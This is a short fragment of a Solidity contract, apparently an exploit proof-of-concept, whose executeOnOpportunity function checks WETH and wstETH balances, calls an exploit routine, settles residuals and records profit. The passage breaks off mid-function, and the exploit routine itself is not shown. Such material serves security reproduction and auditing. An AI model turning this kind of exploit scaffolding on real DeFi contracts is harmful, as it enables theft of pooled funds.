    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        uint256 wethShortfall = _shortfall(WETH.balanceOf(address(this)), JOIN_WETH_AMOUNT + STECRV_SEED_ETH);
        uint256 wstEthShortfall = _shortfall(WSTETH.balanceOf(address(this)), JOIN_WSTETH_AMOUNT);

        if (wethShortfall == 0 && wstEthShortfall == 0) {
            _executeExploitPath();
            _settleResiduals(0);
            _finalizeValidation();
            _profitAmount = WETH.balanceOf(address(this));
            return;
